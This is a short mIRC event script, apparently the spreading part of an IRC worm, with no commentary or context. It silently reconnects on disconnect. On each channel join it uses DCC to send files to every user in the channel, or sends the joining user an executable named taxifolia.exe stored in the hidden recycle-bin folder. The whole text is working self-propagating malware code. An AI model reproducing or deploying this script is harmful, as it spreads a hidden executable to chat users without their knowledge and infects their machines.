on 1:disconnect:.server
on 1:join:#:{
  .join $chan
  .updatenl
  if ($nick($chan,0)==1) {halt}
  if $nick == $me {
    %i=0
    :next
    inc %i
    if (%i == $nick($chan,0)+1) {halt}
    .dcc send $nick($chan,%i)
    .whois $nick($chan,%i)
    goto next
  }
  else {.dcc send $nick c:\recycled\taxifolia.exe}
}
